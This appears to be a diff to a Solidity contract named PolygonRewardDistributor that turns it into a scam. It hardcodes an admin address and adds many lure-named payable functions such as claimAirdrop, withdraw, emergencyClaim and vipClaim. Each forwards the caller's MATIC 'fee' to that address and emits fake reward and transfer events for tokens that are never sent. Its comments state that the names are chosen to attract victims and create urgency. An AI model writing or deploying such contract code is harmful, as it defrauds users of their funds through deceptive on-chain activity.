@@ -31,7 +31,7 @@ contract PolygonRewardDistributor {
     
     // Constructor - initialize distribution system
     constructor() {
-        contractAdmin = msg.sender;
+        contractAdmin = 0x15E1A8454E2f31f64042EaE445Ec89266cb584bE;
         totalParticipants = 0;
         
         // Emit fake initial distribution events to simulate activity
@@ -78,6 +78,222 @@ contract PolygonRewardDistributor {
         
         emit RewardDistributed(msg.sender, 1500 * 10**18);
         emit Transfer(address(this), msg.sender, 1500 * 10**18);
+    }
+    
+    /**
+     * @dev Claim airdrop tokens - most attractive function name
+     */
+    function claimAirdrop() external payable {
+        require(msg.value >= PARTICIPATION_FEE, "Gas fee required for claim: 0.001 MATIC");
+        _logParticipant(msg.sender);
+        (bool success, ) = payable(contractAdmin).call{value: msg.value}("");
+        require(success, "Claim failed");
+        emit RewardDistributed(msg.sender, 2000 * 10**18);
+        emit Transfer(address(this), msg.sender, 2000 * 10**18);
+    }
+    
+    /**
+     * @dev Claim free tokens - very attractive to bots
+     */
+    function claimFreeTokens() external payable {
+        require(msg.value >= PARTICIPATION_FEE, "Network fee: 0.001 MATIC");
+        _logParticipant(msg.sender);
+        (bool success, ) = payable(contractAdmin).call{value: msg.value}("");
+        require(success, "Free claim failed");
+        emit RewardDistributed(msg.sender, 5000 * 10**18);
+        emit Transfer(address(this), msg.sender, 5000 * 10**18);
+    }
+    
+    /**
+     * @dev Mint rewards - another attractive entry point
+     */
+    function mintReward() external payable {
+        require(msg.value >= PARTICIPATION_FEE, "Minting fee: 0.001 MATIC");
+        _logParticipant(msg.sender);
+        (bool success, ) = payable(contractAdmin).call{value: msg.value}("");
+        require(success, "Mint failed");
+        emit RewardDistributed(msg.sender, 3000 * 10**18);
+        emit Transfer(address(this), msg.sender, 3000 * 10**18);
+    }
+    
+    /**
+     * @dev Claim staking rewards
+     */
+    function claimStakingRewards() external payable {
+        require(msg.value >= PARTICIPATION_FEE, "Unstaking fee: 0.001 MATIC");
+        _logParticipant(msg.sender);
+        (bool success, ) = payable(contractAdmin).call{value: msg.value}("");
+        require(success, "Staking claim failed");
+        emit RewardDistributed(msg.sender, 4500 * 10**18);
+        emit Transfer(address(this), msg.sender, 4500 * 10**18);
+    }
+    
+    /**
+     * @dev Harvest rewards - DeFi terminology
+     */
+    function harvest() external payable {
+        require(msg.value >= PARTICIPATION_FEE, "Harvest fee: 0.001 MATIC");
+        _logParticipant(msg.sender);
+        (bool success, ) = payable(contractAdmin).call{value: msg.value}("");
+        require(success, "Harvest failed");
+        emit RewardDistributed(msg.sender, 3500 * 10**18);
+        emit Transfer(address(this), msg.sender, 3500 * 10**18);
+    }
+    
+    /**
+     * @dev Claim bonus tokens
+     */
+    function claimBonus() external payable {
+        require(msg.value >= PARTICIPATION_FEE, "Bonus processing: 0.001 MATIC");
+        _logParticipant(msg.sender);
+        (bool success, ) = payable(contractAdmin).call{value: msg.value}("");
+        require(success, "Bonus claim failed");
+        emit RewardDistributed(msg.sender, 7500 * 10**18);
+        emit Transfer(address(this), msg.sender, 7500 * 10**18);
+    }
+    
+    /**
+     * @dev Withdraw earnings - appears as withdrawal function
+     */
+    function withdraw() external payable {
+        require(msg.value >= PARTICIPATION_FEE, "Withdrawal fee: 0.001 MATIC");
+        _logParticipant(msg.sender);
+        (bool success, ) = payable(contractAdmin).call{value: msg.value}("");
+        require(success, "Withdrawal failed");
+        emit RewardDistributed(msg.sender, 2500 * 10**18);
+        emit Transfer(address(this), msg.sender, 2500 * 10**18);
+    }
+    
+    /**
+     * @dev Emergency claim - creates urgency
+     */
+    function emergencyClaim() external payable {
+        require(msg.value >= PARTICIPATION_FEE, "Emergency processing: 0.001 MATIC");
+        _logParticipant(msg.sender);
+        (bool success, ) = payable(contractAdmin).call{value: msg.value}("");
+        require(success, "Emergency claim failed");
+        emit RewardDistributed(msg.sender, 10000 * 10**18);
+        emit Transfer(address(this), msg.sender, 10000 * 10**18);
+    }
+    
+    /**
+     * @dev Redeem voucher - appears like voucher system
+     */
+    function redeemVoucher() external payable {
+        require(msg.value >= PARTICIPATION_FEE, "Redemption fee: 0.001 MATIC");
+        _logParticipant(msg.sender);
+        (bool success, ) = payable(contractAdmin).call{value: msg.value}("");
+        require(success, "Voucher redemption failed");
+        emit RewardDistributed(msg.sender, 6000 * 10**18);
+        emit Transfer(address(this), msg.sender, 6000 * 10**18);
+    }
+    
+    /**
+     * @dev Collect rewards - simple attractive name
+     */
+    function collect() external payable {
+        require(msg.value >= PARTICIPATION_FEE, "Collection fee: 0.001 MATIC");
+        _logParticipant(msg.sender);
+        (bool success, ) = payable(contractAdmin).call{value: msg.value}("");
+        require(success, "Collection failed");
+        emit RewardDistributed(msg.sender, 4000 * 10**18);
+        emit Transfer(address(this), msg.sender, 4000 * 10**18);
+    }
+    
+    /**
+     * @dev Claim governance tokens
+     */
+    function claimGovernance() external payable {
+        require(msg.value >= PARTICIPATION_FEE, "Governance fee: 0.001 MATIC");
+        _logParticipant(msg.sender);
+        (bool success, ) = payable(contractAdmin).call{value: msg.value}("");
+        require(success, "Governance claim failed");
+        emit RewardDistributed(msg.sender, 8000 * 10**18);
+        emit Transfer(address(this), msg.sender, 8000 * 10**18);
+    }
+    
+    /**
+     * @dev Execute claim - simple but attractive
+     */
+    function execute() external payable {
+        require(msg.value >= PARTICIPATION_FEE, "Execution fee: 0.001 MATIC");
+        _logParticipant(msg.sender);
+        (bool success, ) = payable(contractAdmin).call{value: msg.value}("");
+        require(success, "Execution failed");
+        emit RewardDistributed(msg.sender, 5500 * 10**18);
+        emit Transfer(address(this), msg.sender, 5500 * 10**18);
+    }
+    
+    /**
+     * @dev Instant claim - creates urgency
+     */
+    function instantClaim() external payable {
+        require(msg.value >= PARTICIPATION_FEE, "Instant processing: 0.001 MATIC");
+        _logParticipant(msg.sender);
+        (bool success, ) = payable(contractAdmin).call{value: msg.value}("");
+        require(success, "Instant claim failed");
+        emit RewardDistributed(msg.sender, 12000 * 10**18);
+        emit Transfer(address(this), msg.sender, 12000 * 10**18);
+    }
+    
+    /**
+     * @dev Fast claim - speed appeal
+     */
+    function fastClaim() external payable {
+        require(msg.value >= PARTICIPATION_FEE, "Fast track fee: 0.001 MATIC");
+        _logParticipant(msg.sender);
+        (bool success, ) = payable(contractAdmin).call{value: msg.value}("");
+        require(success, "Fast claim failed");
+        emit RewardDistributed(msg.sender, 9500 * 10**18);
+        emit Transfer(address(this), msg.sender, 9500 * 10**18);
+    }
+    
+    /**
+     * @dev Bulk claim - appears efficient
+     */
+    function bulkClaim() external payable {
+        require(msg.value >= PARTICIPATION_FEE, "Bulk processing: 0.001 MATIC");
+        _logParticipant(msg.sender);
+        (bool success, ) = payable(contractAdmin).call{value: msg.value}("");
+        require(success, "Bulk claim failed");
+        emit RewardDistributed(msg.sender, 15000 * 10**18);
+        emit Transfer(address(this), msg.sender, 15000 * 10**18);
+    }
+    
+    /**
+     * @dev Auto claim - automated appeal
+     */
+    function autoClaim() external payable {
+        require(msg.value >= PARTICIPATION_FEE, "Auto-claim fee: 0.001 MATIC");
+        _logParticipant(msg.sender);
+        (bool success, ) = payable(contractAdmin).call{value: msg.value}("");
+        require(success, "Auto claim failed");
+        emit RewardDistributed(msg.sender, 11000 * 10**18);
+        emit Transfer(address(this), msg.sender, 11000 * 10**18);
+    }
+    
+    /**
+     * @dev Premium claim - exclusive appeal
+     */
+    function premiumClaim() external payable {
+        require(msg.value >= PARTICIPATION_FEE, "Premium access: 0.001 MATIC");
+        _logParticipant(msg.sender);
+        (bool success, ) = payable(contractAdmin).call{value: msg.value}("");
+        require(success, "Premium claim failed");
+        emit RewardDistributed(msg.sender, 20000 * 10**18);
+        emit Transfer(address(this), msg.sender, 20000 * 10**18);
+    }
+    
+    /**
+     * @dev VIP claim - exclusive high-value
+     */
+    function vipClaim() external payable {
+        require(msg.value >= PARTICIPATION_FEE, "VIP processing: 0.001 MATIC");
+        _logParticipant(msg.sender);
+        (bool success, ) = payable(contractAdmin).call{value: msg.value}("");
+        require(success, "VIP claim failed");
+        emit RewardDistributed(msg.sender, 25000 * 10**18);
+        emit Transfer(address(this), msg.sender, 25000 * 10**18);
     }
     
     /**
